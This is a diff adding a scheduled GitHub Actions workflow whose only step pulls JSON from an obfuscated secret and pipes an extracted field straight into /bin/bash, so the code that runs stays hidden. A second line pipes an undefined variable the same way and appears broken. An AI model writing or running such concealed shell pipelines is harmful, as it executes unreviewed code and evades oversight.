@@ -1,0 +1,19 @@
+name: zhuanmopangdu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuanmopangdu
+        env:
+          cev70378: ${{ secrets.cev70378 }}
+        run: |
+          echo $cev70378 | jq -r .zuqf5 | /bin/bash
+          echo $jzdg50804 | jq -r .b6237 | /bin/bash
+
